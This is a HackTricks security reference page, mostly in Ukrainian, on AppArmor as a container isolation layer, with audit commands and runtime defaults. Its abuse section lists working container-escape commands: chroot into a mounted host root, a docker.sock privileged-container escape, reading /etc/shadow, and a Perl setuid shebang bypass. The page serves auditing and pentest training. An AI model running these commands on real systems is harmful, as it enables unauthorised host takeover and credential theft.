# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

AppArmor — це **обов'язковий контроль доступу (Mandatory Access Control)**, який застосовує обмеження через профілі для кожної програми. На відміну від традиційних перевірок DAC, що значною мірою залежать від власника користувача та групи, AppArmor дозволяє ядру застосовувати політику, прив'язану безпосередньо до процесу. У контейнерних середовищах це важливо, бо робоче навантаження може мати достатні традиційні привілеї для виконання дії, але все одно буде відхилено, оскільки його профіль AppArmor не дозволяє відповідний шлях, маунт, мережеву поведінку або використання можливостей (capabilities).

Найважливіша концептуальна риса — AppArmor є **орієнтованим на шляхи (path-based)**. Він оцінює доступ до файлової системи за правилами, що ґрунтуються на шляхах, а не за мітками, як це робить SELinux. Це робить його доступним і потужним, але також означає, що bind mounts і альтернативні розташування шляхів потребують уважної уваги. Якщо один і той же вміст хоста стане доступний за іншим шляхом, дія політики може відрізнятися від того, чого оператор очікував спочатку.

## Роль у ізоляції контейнерів

Огляди безпеки контейнерів часто обмежуються перевірками capabilities та seccomp, але AppArmor залишається важливим після цих перевірок. Уявіть контейнер, який має більше привілеїв, ніж повинен, або робоче навантаження, якому з операційних причин потрібна додаткова capability. AppArmor все одно може обмежувати доступ до файлів, поведінку маунтів, мережу та патерни виконання так, щоб блокувати очевидний шлях для зловживань. Саме тому вимкнення AppArmor "щоб просто змусити додаток працювати" може непомітно перетворити просто ризикову конфігурацію на таку, що активно експлуатується.

## Лабораторія

Щоб перевірити, чи AppArmor активний на хості, використайте:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Щоб дізнатися, під ким запущено поточний процес контейнера:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Різниця повчальна. У звичайному випадку процес має показувати контекст AppArmor, прив'язаний до профілю, обраного runtime. У випадку unconfined цей додатковий шар обмежень зникає.

Ви також можете перевірити, що Docker вважає, що застосовано:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Використання під час виконання

Docker може застосовувати стандартний або кастомний профіль AppArmor, якщо хост це підтримує. Podman також може інтегруватися з AppArmor на системах з AppArmor, хоча на дистрибутивах, орієнтованих на SELinux, інша MAC-система часто домінує. Kubernetes може експонувати політику AppArmor на рівні workload на нодах, які фактично підтримують AppArmor. LXC і пов'язані середовища system-container сімейства Ubuntu також широко використовують AppArmor.

Практичний висновок: AppArmor — це не «Docker feature». Це функція хоста/ядра, яку кілька runtimes можуть застосувати. Якщо хост не підтримує її або runtime вказано запускатися unconfined, очікуваного захисту насправді немає.

Зокрема для Kubernetes сучасним API є `securityContext.appArmorProfile`. З Kubernetes `v1.30` старі бета AppArmor annotations застаріли. На хостах з підтримкою `RuntimeDefault` — профіль за замовчуванням, а `Localhost` вказує на профіль, який повинен бути вже завантажений на ноді. Це важливо під час рев'ю, оскільки маніфест може виглядати AppArmor-aware і водночас повністю залежати від підтримки на стороні ноди та попередньо завантажених профілів.

Одна тонка, але корисна операційна деталь: явне встановлення `appArmorProfile.type: RuntimeDefault` є суворішим, ніж просто пропуск поля. Якщо поле явно вказане і нода не підтримує AppArmor, admission має відхилити. Якщо поле опущене, workload все ще може запуститися на ноді без AppArmor і просто не отримати той додатковий рівень обмеження. З точки зору зловмисника, це добра причина перевіряти і маніфест, і фактичний стан ноди.

На хостах з підтримкою AppArmor для Docker найвідомішим значенням за замовчуванням є `docker-default`. Цей профіль генерується з Moby's AppArmor template і важливий, бо пояснює, чому деякі capability-based PoCs все ще не працюють у контейнері за замовчуванням. В загальних рисах `docker-default` дозволяє звичайні мережеві операції, забороняє записи в значну частину `/proc`, забороняє доступ до чутливих частин `/sys`, блокує операції mount і обмежує ptrace так, щоб це не було загальною примітивною можливістю для дослідження хоста. Розуміння цієї базової політики допомагає відрізнити «контейнер має `CAP_SYS_ADMIN`» від «контейнер може фактично використати цю capability проти інтерфейсів ядра, які мене цікавлять».

## Керування профілями

AppArmor профілі зазвичай зберігаються під `/etc/apparmor.d/`. Загальна конвенція найменування — замінювати слеші в шляху до виконуваного файлу на крапки. Наприклад, профіль для `/usr/bin/man` звичайно зберігається як `/etc/apparmor.d/usr.bin.man`. Ця деталь важлива як для захисту, так і для оцінки, бо як тільки ви знаєте назву активного профілю, ви часто можете швидко знайти відповідний файл на хості.

Корисні команди для керування на стороні хоста включають:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Причина, чому ці команди важливі в довіднику container-security, полягає в тому, що вони пояснюють, як профілі фактично створюються, завантажуються, переводяться в complain mode і змінюються після змін у застосунку. Якщо оператор має звичку переводити профілі в complain mode під час усунення неполадок і забувати відновити enforcement, контейнер може виглядати захищеним у документації, але насправді поводитися набагато вільніше.

### Створення та оновлення профілів

`aa-genprof` може спостерігати за поведінкою застосунку і допомагати інтерактивно згенерувати профіль:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` може згенерувати шаблон профілю, який пізніше можна буде завантажити за допомогою `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Коли бінар змінюється й політику потрібно оновити, `aa-logprof` може відтворювати denials, знайдені в логах, і допомогти оператору вирішити, дозволити чи заборонити їх:
```bash
sudo aa-logprof
```
### Журнали

Відмови AppArmor часто видно через `auditd`, syslog або інструменти, такі як `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Це корисно операційно та в наступальних цілях. Захисники використовують це для уточнення профілів. Атакувальники використовують це, щоб дізнатися, який саме шлях або операція відхиляються і чи саме AppArmor блокує exploit chain.

### Визначення точного файлу профілю

Коли runtime показує конкретне ім'я профілю AppArmor для контейнера, часто корисно зіставити це ім'я з файлом профілю на диску:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Це особливо корисно під час огляду на боці хоста, оскільки воно долає розрив між «контейнер вказує, що він працює під профілем `lowpriv`» та «фактичні правила знаходяться в цьому конкретному файлі, який можна аудиторувати або перезавантажити».

### Ключові правила для аудиту

Якщо ви можете прочитати профіль, не зупиняйтесь тільки на простих рядках `deny`. Декілька типів правил суттєво змінюють, наскільки корисним буде AppArmor проти спроби виходу з контейнера:

- `ux` / `Ux`: виконати цільовий бінарний файл без обмежень. Якщо доступний helper, shell або interpreter дозволений під `ux`, зазвичай це перше, що варто протестувати.
- `px` / `Px` and `cx` / `Cx`: виконують переходи профілю при exec. Це не обов’язково погано, але ці правила варто перевірити, бо перехід може призвести до попадання в набагато ширший профіль, ніж поточний.
- `change_profile`: дозволяє задачі переключитися в інший завантажений профіль негайно або при наступному exec. Якщо цільовий профіль слабший, це може стати лазівкою для виходу з обмежувального домену.
- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: це має впливати на рівень довіри до профілю. `complain` логуватиме відмови замість їх примусового застосування, `unconfined` знімає межу, а `prompt` залежить від рішення в userspace, а не від чистого відмови, накладеного ядром.
- `userns` or `userns create,`: новіша політика AppArmor може контролювати створення user namespaces. Якщо профіль контейнера явно це дозволяє, вкладені user namespaces залишаються в силі навіть коли платформа використовує AppArmor як частину стратегії жорсткого захисту.

Корисний grep на боці хоста:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Цей тип аудиту часто корисніший, ніж перегляд сотень звичайних правил для файлів. Якщо breakout залежить від виконання helper, переходу в інший namespace або втечі в менш обмежений profile, відповідь часто прихована в цих правилах, орієнтованих на переходи, а не в очевидних рядках типу `deny /etc/shadow r`.

## Неправильні конфігурації

Найочевидніша помилка — `apparmor=unconfined`. Адміністратори часто встановлюють його під час відладки програми, яка впала, оскільки profile правильно заблокував щось небезпечне або непередбачене. Якщо прапорець лишається в продукційному середовищі, весь рівень MAC фактично видалено.

Ще одна тонка проблема — припущення, що bind mounts нешкідливі, бо права файлів виглядають звичайними. Оскільки AppArmor базується на шляхах, відкриття шляхів хоста під альтернативними точками монтування може погано взаємодіяти з правилами по шляхах. Третя помилка — забувати, що ім'я profile в конфігураційному файлі мало що означає, якщо ядро хоста фактично не застосовує AppArmor.

## Зловживання

Коли AppArmor відсутній, операції, які раніше були обмежені, можуть раптово почати працювати: читання чутливих шляхів через bind mounts, доступ до частин procfs або sysfs, які мали залишатися складнішими у використанні, виконання дій, пов'язаних із mount, якщо capabilities/seccomp також це дозволяють, або використання шляхів, які profile зазвичай відхилив. AppArmor часто є тим механізмом, що пояснює, чому спроба breakout, основана на capabilities, «в теорії має працювати», але на практиці все одно зазнає невдачі. Видаліть AppArmor — і та сама спроба може почати вдаватися.

Якщо ви підозрюєте, що AppArmor є основною причиною, яка перешкоджає chain зловживань через path-traversal, bind-mount або mount-based, першим кроком зазвичай буде порівняти, що стає доступним з profile і без нього. Наприклад, якщо шлях хоста змонтовано всередині контейнера, почніть з перевірки, чи можете ви його пройти і прочитати:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Якщо container також має небезпечну capability, таку як `CAP_SYS_ADMIN`, один із найпрактичніших тестів — з'ясувати, чи саме AppArmor блокує mount operations або доступ до чутливих kernel filesystems:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
У середовищах, де шлях хоста вже доступний через bind mount, втрата AppArmor може також перетворити read-only проблему розкриття інформації на прямий доступ до файлів хоста:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Суть цих команд не в тому, що AppArmor сам по собі створює втечу. Сутність у тому, що після видалення AppArmor багато шляхів зловживань, пов'язаних із файловою системою та монтованнями, одразу стають доступними для тестування.

### Повний приклад: AppArmor вимкнено + корінь хоста змонтовано

Якщо контейнер вже має корінь хоста bind-mounted на `/host`, видалення AppArmor може перетворити заблокований шлях зловживання файловою системою на повноцінну втечу на хост:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Як тільки shell виконується через файлову систему хоста, робоче навантаження фактично вийшло за межі контейнера:
```bash
id
hostname
cat /etc/shadow | head
```
### Повний приклад: AppArmor відключено + Runtime Socket

Якщо справжнім бар'єром був AppArmor, який ізолює стан виконання (runtime), то змонтований сокет може бути достатнім для повного виходу:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Точний шлях залежить від точки монтування, але кінцевий результат той самий: AppArmor більше не перешкоджає доступу до runtime API, і runtime API може запустити контейнер, що скомпрометує хост.

### Full Example: Path-Based Bind-Mount Bypass

Оскільки AppArmor базується на шляхах, захист `/proc/**` не автоматично захищає той самий вміст procfs хоста, коли до нього можна дістатися через інший шлях:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Наслідки залежать від того, що саме змонтовано і чи дозволяє альтернативний шлях також обійти інші механізми контролю, але ця схема є одним із найяскравіших доказів того, що AppArmor потрібно оцінювати разом із структурою монтування, а не ізольовано.

### Повний приклад: Shebang Bypass

Політика AppArmor іноді націлюється на шлях до інтерпретатора таким чином, що не повністю враховує виконання скриптів через обробку shebang. Історичний приклад стосувався використання скрипта, перший рядок якого вказував на обмежений інтерпретатор:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Такий приклад важливий як нагадування про те, що profile intent і фактична семантика виконання можуть розходитися. Під час перегляду AppArmor у container-середовищах interpreter chains і alternate execution paths заслуговують на особливу увагу.

## Перевірки

Мета цих перевірок — швидко відповісти на три питання: чи увімкнено AppArmor на host, чи обмежено поточний process, і чи runtime фактично застосував profile до цього container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
What is interesting here:

- If `/proc/self/attr/current` shows `unconfined`, the workload is not benefiting from AppArmor confinement.
- If `aa-status` shows AppArmor disabled or not loaded, any profile name in the runtime config is mostly cosmetic.
- If `docker inspect` shows `unconfined` or an unexpected custom profile, that is often the reason a filesystem or mount-based abuse path works.
- If `/sys/kernel/security/apparmor/profiles` does not contain the profile you expected, the runtime or orchestrator configuration is not enough by itself.
- If a supposedly hardened profile contains `ux`, broad `change_profile`, `userns`, or `flags=(complain)` style rules, the practical boundary may be much weaker than the profile name suggests.

If a container already has elevated privileges for operational reasons, leaving AppArmor enabled often makes the difference between a controlled exception and a much broader security failure.

## Налаштування runtime за замовчуванням

| Runtime / платформа | Стан за замовчуванням | Поведінка за замовчуванням | Типові ручні послаблення |
| --- | --- | --- | --- |
| Docker Engine | Увімкнено за замовчуванням на хостах, які підтримують AppArmor | Використовує профіль AppArmor `docker-default`, якщо його явно не перевизначено | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Залежить від хоста | AppArmor підтримується через `--security-opt`, але точний стан за замовчуванням залежить від хоста/рантайму і менш універсальний, ніж задокументований у Docker профіль `docker-default` | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Умовне значення за замовчуванням | Якщо `appArmorProfile.type` не вказано, за замовчуванням застосовується `RuntimeDefault`, але це діє лише коли AppArmor увімкнено на вузлі | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` з слабким профілем, вузли без підтримки AppArmor |
| containerd / CRI-O under Kubernetes | Залежить від підтримки вузла/рантайму | Типові рантайми, підтримувані Kubernetes, підтримують AppArmor, але фактичне застосування все одно залежить від підтримки на вузлі та налаштувань ворклоуду | Те ж, що й для Kubernetes; прямі налаштування рантайму також можуть повністю обійти AppArmor |

For AppArmor, the most important variable is often the **host**, not only the runtime. A profile setting in a manifest does not create confinement on a node where AppArmor is not enabled.

## Посилання

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
